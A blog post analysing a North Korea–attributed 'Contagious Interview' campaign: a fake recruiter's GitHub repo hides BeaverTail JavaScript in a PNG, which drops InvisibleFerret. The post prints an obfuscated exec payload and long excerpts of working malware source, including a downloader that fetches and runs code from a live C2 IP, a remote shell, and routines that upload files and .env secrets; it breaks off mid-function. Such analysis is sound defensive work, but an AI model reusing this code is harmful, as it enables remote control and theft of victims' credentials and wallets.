---
layout: post
Author: Eoka
---

Before we get into the meat and potatoes of this interesting case I have to thank all the people involved who helped with the analysis of this campaign <insert list here>

## The Beginning

This all started when one of our members noticed a user of the TryHackMe Discord server talking about some malicious activity they had detected on their pc. The User had discovered a malicious python file called "Windows Update Script.pyw" located in their Windows start-up directory. Our member then visited the any.run link the user had posted and downloaded the malicious sample.
On brief analysis of the malicious script he determined the file to belong to the malware family Invisible Ferret which is often attributed to North Korean state backed APT groups.

## Chain of events

The Victim initially reached out to an account on LinkedIn "hxxps[://]www[.]linkedin[.]com/in/keith-ingersoll-4558b367/ "regarding an opportunity to work on a new crypto project. This account then transferred the victim to "hxxps[://]www[.]linkedin[.]com/in/lucas-mechado-748124328/" who proposed that the victim work on a fashion NFT project instead.

<img src="/assets/img/beaver/contact.png" alt="initial contact">
*initial contact*

The hacker then tells the victim that they will need to test and update the scaffold project as part of the interview process, this is when the malicious payload is executed on the victim system. This technique is part of a campaign dubbed "Contagious Interview" which again is mostly attributed to North Korean APTs.

<img src="/assets/img/beaver/instructions.png" alt="hacker gives instructions">
*hacker gives instructions*

The user was then sent a link to a GitHub repo "hxxps[://]github[.]com/bigturn616/NFTmarketplace" containing the So called scaffold project which they did run on their machine. This repo contained a malicious JS script belonging to the malware Family "Beaver Tail" which is used to then drop the "InvisibleFerret" python malware. Both of these malware families belong to North Korean groups. The user luckily still had the repository download on their system which they were able to send to us for analysis.

## That's no image

On analysis of the malicious repository we were able to identify a PNG file "illustration_emprt_background.png" which contained the obfuscated beavertail JavaScript malware. This file was then loaded by mailer.js located in "server\middlewares\helpers" which read the JS contents and executed them using eval.

<img src="/assets/img/beaver/fake.png" alt="the fake png containing beavertail">
*the fake png containing beavertail*

<img src="/assets/img/beaver/payloadexec.png" alt="the code executing the payload">
*the code executing the payload*

Running the JS through https://obf-io.deobfuscate.io/ allowed us to get a much better understanding of what the beavertail malware actually does.
One of the first things we noticed was it targeting browsers and their extensions presumably to harvest user data and further analysis of these extension ids revealed they all relate to crypto currency, further cementing the theory that they are stealing crypto for use in the nuclear program.

<img src="/assets/img/beaver/extensions.png" alt="extensions and browsers">

After extracting users data from browsers and trying to gather seed phrases and wallet addresses from the browser profiles the malware then attempts to download python and the "InvisibleFerret" python payload for the next stages of infection. It will check if python already exists and if not pulls it from "hxxp[://]86[.]104[.]74[.]51:1224/pdown" and the malware is downloaded from "hxxp[://]86[.]104[.]74[.]51:1224/client/3/618"

## Analysing the Python code

The python file we retrieve from the C2 is called "main3_618.py" and contains zlib encoded data. This file matches the payload we downloaded from the victims any.run sample however theirs was a file called 905. This was easily de-ofbuscated by using binary refinery to iterate over the data 50 times which led us to the next part of the puzzle.
{% highlight python %}
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
{% endhighlight %}

{% highlight bash %}
 ef 905 | loop 50 rev:csd[b64]:zl
{% endhighlight %}

After running the bin-ref oneliner against the main3_618.py file we are left with the plaintext code which lets us see what operations the first stage is doing.

{% highlight python %}
import base64,platform,os,subprocess,sys
try:import requests
except:subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests']);import requests

sType = "9"
gType = "905"
ot = platform.system()
home = os.path.expanduser("~")
#host1 = "10.10.51.212"
host1 = "86.104.74.51"
host2 = f'http://{host1}:1224'
pd = os.path.join(home, ".n2")
ap = pd + "/pay"
def download_payload():
    if os.path.exists(ap):
        try:os.remove(ap)
        except OSError:return True
    try:
        if not os.path.exists(pd):os.makedirs(pd)
    except:pass

    try:
        if ot=="Darwin":
            # aa = requests.get(host2+"/payload1/"+sType+"/"+gType, allow_redirects=True)
            aa = requests.get(host2+"/payload/"+sType+"/"+gType, allow_redirects=True)
            with open(ap, 'wb') as f:f.write(aa.content)
        else:
            aa = requests.get(host2+"/payload/"+sType+"/"+gType, allow_redirects=True)
            with open(ap, 'wb') as f:f.write(aa.content)
        return True
    except Exception as e:return False
res=download_payload()
if res:
    if ot=="Windows":subprocess.Popen([sys.executable, ap], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP)
    else:subprocess.Popen([sys.executable, ap])

if ot=="Darwin":sys.exit(-1)

ap = pd + "/bow"

def download_browse():
    if os.path.exists(ap):
        try:os.remove(ap)
        except OSError:return True
    try:
        if not os.path.exists(pd):os.makedirs(pd)
    except:pass
    try:
        aa=requests.get(host2+"/brow/"+ sType +"/"+gType, allow_redirects=True)
        with open(ap, 'wb') as f:f.write(aa.content)
        return True
    except Exception as e:return False
res=download_browse()
if res:
    if ot=="Windows":subprocess.Popen([sys.executable, ap], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP)
    else:subprocess.Popen([sys.executable, ap])

ap = pd + "/mlip"

def download_mclip():
    if os.path.exists(ap):
        try:os.remove(ap)
        except OSError:return True
    try:
        if not os.path.exists(pd):os.makedirs(pd)
    except:pass
    try:
        aa=requests.get(host2+"/mclip/"+ sType +"/"+gType, allow_redirects=True)
        with open(ap, 'wb') as f:f.write(aa.content)
        return True
    except Exception as e:return False
res=download_mclip()
if res:
    if ot=="Windows":subprocess.Popen([sys.executable, ap], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP)
    else:subprocess.Popen([sys.executable, ap])
{% endhighlight %}

The first operation the file does is check to make sure the requests module is installed and if not then tries to install that using subprocess to run the command. This ensures that the script can run on all machines.
We then see that the authors are defining the variables needed to pull down further payloads which include the C2 IP, the payload paths and the unique identifiers for the payload

{% highlight python %}
sType = "9" # unique identifier 1
gType = "905" # unique identifier 2
ot = platform.system() # fetches OS 
home = os.path.expanduser("~") # fetches home path
#host1 = "10.10.51.212" (this was left in by authors)
host1 = "86.104.74.51" # C2 IP
host2 = f'http://{host1}:1224' # C2 URL with port
pd = os.path.join(home, ".n2") # Path to download payload 1
ap = pd + "/pay" # Path to download payload 2
{% endhighlight %}

We then see that the script defines and calls the download_payload function which fetches itself from the C2 URL using the two unique identifiers, saves it and executes it in the pre defined paths. This is for setting up persistence.

{% highlight python %}
def download_payload():
    if os.path.exists(ap):
        try:os.remove(ap)
        except OSError:return True
    try:
        if not os.path.exists(pd):os.makedirs(pd)
    except:pass

    try:
        if ot=="Darwin":
            # aa = requests.get(host2+"/payload1/"+sType+"/"+gType, allow_redirects=True) (again left in by authors.. like seriously did an intern write this?))
            aa = requests.get(host2+"/payload/"+sType+"/"+gType, allow_redirects=True)
            with open(ap, 'wb') as f:f.write(aa.content)
        else:
            aa = requests.get(host2+"/payload/"+sType+"/"+gType, allow_redirects=True)
            with open(ap, 'wb') as f:f.write(aa.content)
        return True
    except Exception as e:return False
res=download_payload()
{% endhighlight %}

The next payload that this stage downloads is a info-stealing malware located on the brow endpoint of the C2, again using the unique identifiers set at the beginning of the script. This script is used to steal sensitive browser data, data regarding GitHub repositories and set up rat connection.

{% highlight python %}
ap = pd + "/bow"

def download_browse():
    if os.path.exists(ap):
        try:os.remove(ap)
        except OSError:return True
    try:
        if not os.path.exists(pd):os.makedirs(pd)
    except:pass
    try:
        aa=requests.get(host2+"/brow/"+ sType +"/"+gType, allow_redirects=True)
        with open(ap, 'wb') as f:f.write(aa.content)
        return True
    except Exception as e:return False
res=download_browse()
if res:
    if ot=="Windows":subprocess.Popen([sys.executable, ap], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP)
    else:subprocess.Popen([sys.executable, ap])
{% endhighlight %}

The final part of the script is the download_mclip function which attempts to download and execute a clipboard jacking malware in an attempt to key log and replace crypto currency wallet addresses once again we see the unique identifiers being used to pull the file

{% highlight python %}
def download_mclip():
    if os.path.exists(ap):
        try:os.remove(ap)
        except OSError:return True
    try:
        if not os.path.exists(pd):os.makedirs(pd)
    except:pass
    try:
        aa=requests.get(host2+"/mclip/"+ sType +"/"+gType, allow_redirects=True)
        with open(ap, 'wb') as f:f.write(aa.content)
        return True
    except Exception as e:return False
res=download_mclip()
if res:
    if ot=="Windows":subprocess.Popen([sys.executable, ap], creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP)
    else:subprocess.Popen([sys.executable, ap])
{% endhighlight %}

## Your info is My info

As I mentioned the payload also installs a infostealer/RAT payload to be able to steal victim data including logins and card details as well as set up a rat connection and SSH shell for further control over the system. This file is downloaded to "pay9_905.py" and is executed the same way as before. This file is way too big to dig into fully on here so I will focus on the main parts.
Firstly the stealer fetches as much information about the target machine as possible, using ip-api.com to fetch the IP address and subsequent location data, as well as pythons platform library to extract the Username, UUID, OS, Release and hostname of the system.

{% highlight python %}
class HostInfo(object):
    def __init__(A):
        A.system=system()
        if gType == "root":
            A.hostname=node()
        else:
            A.hostname=gType + "_" + node()
        A.release=release()
        A.version=version()
        A.username=getuser()
        A.uuid=A.getID()
    def getID(A):return sha256((str(getnode())+getuser()).encode()).digest().hex()
    def sysinfo(A):return{'uuid':A.uuid,'system':A.system,'release':A.release,'version':A.version,'hostname':A.hostname,'username':A.username}

class Position(object):
    def __init__(A):A.geo=A.get_geo();A.internal_ip=A.get_internal_ip()
    def get_internal_ip(A):
        try:return socket.gethostbyname_ex(hn)[-1][-1]
        except:return''
    def get_geo(A):
        try:return get('http://ip-api.com/json').json()
        except:pass
    def net_info(A):
        g=A.get_geo()
        if g:
            ii=A.internal_ip
            if ii:g['internalIp']=ii
        return g

class SysInfo(object):
    def __init__(A):A.net_info=Position().net_info();A.sys_info=HostInfo().sysinfo()
    def parse(K,data):
        J='regionName';I='country';H='query';G='city';F='isp';E='zip';D='lon';C='lat';B='timezone';_A='internalIp'
        A=data;A={C:A[C]if C in A else'',D:A[D]if D in A else'',E:A[E]if E in A else'',F:A[F]if F in A else'',G:A[G]if G in A else'',H:A[H]if H in A else'',I:A[I]if I in A else'',B:A[B]if B in A else'',J:A[J]if J in A else'',_A:A[_A]if _A in A else''}
        if'/'in A[B]:A[B]=A[B].replace('/',' ')
        if'_'in A[B]:A[B]=A[B].replace('_',' ')
        return A
    def get_info(A):B=A.net_info;return{'sys_info':A.sys_info,'net_info':A.parse(B if B else[])}
{% endhighlight %}

The payload then posts the syinfo data to the keys endpoint on the c2

{% highlight python %}
class Trans(object):
    def __init__(A):A.sys_info=SysInfo().get_info()
    def contact_server(A,ip,port):
        A.ip,A.port=ip,int(port);B=int(time.time()*1000);C={'ts':str(B),'type':sType,'hid':hn,'ss':'sys_info','cc':str(A.sys_info)};D=f"http://{A.ip}:{A.port}/keys"
        try:post(D,data=C)
        except Exception as e:pass
def run_comm():c=Trans();c.contact_server(HOST, PORT);del c
run_comm()
{% endhighlight %}

One of the many modules of this payload is a SSH reverse shell which lets the attackers gain finer control over the infected system letting them, in this case, open CMD, kill python.exe, and upload files.

{% highlight python %}
os_type = platform.system()
class Shell(object):
    def __init__(A,S):
        A.sess = S;A.is_alive = _T;A.is_delete = _F;A.lock = RLock();A.timeout_count=0;A.cp_stop=0
        A.par_dir = os.path.join(os.path.expanduser("~"), ".n2")
        A.cmds = {1:A.ssh_obj,2:A.ssh_cmd,3:A.ssh_clip,4:A.ssh_run,5:A.ssh_upload,6:A.ssh_kill,7:A.ssh_any,8:A.ssh_env}
        print("init success")
    def listen_recv(A):
        while A.is_alive:
            try:
                print("start listen")
                recv=A.sess.recv()
                print("listen recv:", recv)
                if recv==-1:
                    if A.timeout_count<30:A.timeout_count+=1;continue
                    else:A.timeout_count=0;recv=_N
                if recv:
                    A.timeout_count=0
                    with A.lock:
                        D=json.loads(recv);c=D['code'];args=D['args']
                        try:
                            if c != 2:
                                args=ast.literal_eval(args)
                        except:
                            pass
                        if c in A.cmds:tg=A.cmds[c];t=Thread(target=tg,args=(args,));t.start()#tg(args)
                        else:
                            if A.is_alive:A.is_alive=_F;A.close()
                else:
                    if A.is_alive:A.timeout_count=0;A.is_alive=_F;A.close()
            except Exception as ex:print("error_listen:", ex)

    def shell(A):
        print("start shell")
        t1 = Thread(target=A.listen_recv);t1.daemon=_T;t1.start()
        while A.is_alive:
            try:sleep(5)
            except:break
        A.close()
        return A.is_delete

    def send(A,code=_N,args=_N):A.sess.send(code=code,args=args)
    def sendall(A,m):A.sess.sendall(m)
    def close(A):A.is_alive=_F;A.sess.shutdown()
    def send_n(A,a,n,o):p={_A:a,_O:o};A.send(code=n,args=p)

    def ssh_cmd(A,args):
        try:
            if os_type == "Windows":
                subprocess.Popen('taskkill /IM /F python.exe', shell=_T)
            else:
                subprocess.Popen('killall python', shell=_T)
        except: pass

    def ssh_obj(A,args):
        o=''
        try:
            a=args[_A];cmd=args['cmd']
            if cmd == '':o=''
            elif cmd.split()[0] == 'cd':
                proc = subprocess.Popen(cmd, shell=_T)
                if len(cmd.split()) != 1:
                    p=' '.join(cmd.split()[1:])
                    if os.path.exists(p):os.chdir(p)
                o=os.getcwd()
            else:
                proc=subprocess.Popen(cmd,shell=_T,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()
                try:o=decode_str(proc[0]);err=decode_str(proc[1])
                except:o=proc[0];err=proc[1]
                o=o if o else err
        except:pass
        p={_A:a,_O:o};A.send(code=1, args=p)

    def ssh_clip(A,args):
        global e_buf
        try:A.send(code=3, args=e_buf);e_buf = ""
        except:pass

    def bro_down(A,p):
        if os.path.exists(p):
            try:os.remove(p)
            except OSError:return _T
        try:
            if not os.path.exists(A.par_dir):os.makedirs(A.par_dir)
        except:pass

        host2 = f"http://{HOST}:{PORT}"
        try:
            myfile = requests.get(host2+"/brow/"+sType+"/"+gType, allow_redirects=_T)
            with open(p,'wb') as f:f.write(myfile.content)
            return _T
        except Exception as e:return _F

    def ssh_run(A,args):
        try:
            a=args[_A];p=A.par_dir+"/bow";res=A.bro_down(p)
            if res:
                if os_type == "Windows":subprocess.Popen([sys.executable,p],creationflags=subprocess.CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP)
                else:subprocess.Popen([sys.executable,p])
            o = os_type + ' get browse'
        except Exception as e:o = f'Err4: {e}';pass
        p={_A:a,_O: o};A.send(code=4,args=p)

    def send_5(A,a,o):A.send_n(a,5,o)

    def ssh_upload(A,args):
        o=''
        try:
            D=args[_A];cmd=args['cmd']
            cmd=ast.literal_eval(cmd)
            if 'sdir' in cmd:sdir=cmd['sdir'];dn=cmd['dname'];sdir=sdir.strip();dn=dn.strip();A.ss_upd(D,cmd,sdir,dn);return _T
            elif 'sfile' in cmd:sfile=cmd['sfile'];dn=cmd['dname'];sfile=sfile.strip();dn=dn.strip();A.ss_upf(D,cmd,sfile,dn);return _T
            elif 'sfind' in cmd:dn=cmd['dname'];pat=cmd['sfind'];dn=dn.strip();pat=pat.strip();A.ss_ufind(D,cmd,dn,pat);return _T
            else:A.ss_ups();o='Stopped ...'
        except Exception as e:print("error_upload:", str(e));o = f'Err4: {e}';pass
        A.send_5(D,o)

    def ss_upd(A,D,args,sd,name):
        A.cp_stop=0;t=_N
        try:
            if sd=='.':sd=os.getcwd()
            A.send_5(D,' >> upload start: ' + sd)
            res=ld(sd,'')
            A.send_5(D,'  -count: ' + str(len(res)-1))
            for (x,y) in res:
                if A.cp_stop==1:A.send_5(D,' upload stopped ');return
                if y=='':continue
                A.ss_hup(os.path.join(sd,y),D,name,5)
            A.send_5(D,' uploaded success ')
        except Exception as ex:
            o=' copy error :'+str(ex);A.send_5(D,o)

    def ss_hup(A,sn,D,name,n):
        try:
            up_time = str(int(time.time()))
            files = [
                ('multi_file', (up_time + '_' + os.path.basename(sn), open(sn, 'rb'))),
            ]
            r = {
                'type': sType,
                'hid': gType + '_' + sHost,
                'uts': name,
            }
            host2 = f"http://{HOST}:{PORT}"
            requests.post(host2 + "/uploads", files=files, data=r)
            if os.path.basename(sn) != 'flist':
                write_flist(up_time + '_' + os.path.basename(sn) + " : " + sn + "\n")
                o=' copied ' + fmt_s(os.path.getsize(sn)) + ':  ' + os.path.basename(sn)
                A.send_n(D,n,o)
            else:
                os.remove(sn)
        except Exception as e:o=' failed: '+sn+' > '+str(e);A.send_n(D,n,o)

    def ss_upf(A,admin,args,sfile,name):
        D=admin;A.cp_stop=0;t=_N
        try:
            sdir=os.getcwd()
            A.send_5(D,' >> upload start: ' + sdir + ' ' + sfile)
            sn=os.path.join(sdir,sfile)
            A.ss_hup(sn,D,name,5)
            A.send_5(D,' uploaded done ')
        except Exception as ex:
            o=' copy error :'+str(ex);A.send_5(D,o)

    def ss_ufind(A,D,args,name,pat):
        A.cp_stop=0;t=_N
        try:
            A.send_5(D,' >> ufind start: ' + os.getcwd())
            if os_type == "Windows":
                command = 'dir /b /s ' + pat + ' | findstr /v /i "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi"'
            else:
                command = 'find . -type d -name "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi" -prune -o -name ' + pat + ' -print'
            proc=subprocess.Popen(command,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()
            
            dirs = proc[0].decode('utf8').split('\n')
            if dirs == ['']:
                A.send_5(D,'  -count: ' + str(0))
                A.send_5(D,' Not exist ')
            else:
                A.send_5(D,'  -count: ' + str(len(dirs)-1))
                for key in dirs:
                    if A.cp_stop == 1:A.send_5(D,' upload stopped ');break
                    if key.strip() == '':
                        continue
                    A.ss_hup(key.strip(),D,name,5)
                A.send_5(D,' ufind success ')
        except Exception as ex:
            o=' copy error :'+str(ex);A.send_5(D,o)

    def ss_ups(A):A.cp_stop=1

    def ss_uenv(A,D,C):
        proc=subprocess.Popen(C,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()
            
        dirs = proc[0].decode('utf8').split('\n')
        if dirs == ['']:
            A.send_n(D, 8,'  -count: ' + str(0))
        else:
            A.send_n(D, 8,'  -count: ' + str(len(dirs)-1))
            for key in dirs:
                if A.cp_stop == 1:A.send_n(D, 8,' upload stopped ');break
                if key.strip() == '':
                    continue

                A.ss_hup(key.strip(),D,'global_env',8)

    def ssh_env(A,args):
        drive_list = ['C', 'D', 'E', 'F', 'G']
        A.cp_stop = 0
        try:
            a=args[_A];c=args['cmd']
            c=ast.literal_eval(c)
            A.send_n(a,8,'--- uenv start ')

            if os_type == "Windows":
                for key in drive_list:
                    if os.path.exists(f"{key}:\\") == False:
                        continue
                    c = 'dir /b /s ' + key + ':\*.env | findstr /v /i "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi"'
                    A.ss_uenv(a,c)
            else:
                c = 'find ~/ -type d -name "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi" -prune -o -name *.env -print'
                A.ss_uenv(a,c)
            A.send_n(a,8,'--- uenv success ')
        except Exception as e:A.send_n(a,8,' uenv err: '+str(e))

    def ssh_kill(A,args):
        D=args[_A]
        if os_type == "Windows":
            try:subprocess.Popen('taskkill /IM chrome.exe /F')
            except:pass
            try:subprocess.Popen('taskkill /IM brave.exe /F')
            except:pass
        else:
            try:subprocess.Popen('killall Google\ Chrome')
            except:pass
            try:subprocess.Popen('killall Brave\ Browser')
            except:pass
        p={_A:D,_O: 'Chrome & Browser are terminated'}
        A.send(code=6,args=p)

    def down_any(A,p):
        if os.path.exists(p):
            try:os.remove(p)
            except OSError:return _T
        try:
            if not os.path.exists(A.par_dir):os.makedirs(A.par_dir)
        except:pass

        host2 = f"http://{HOST}:{PORT}"
        try:
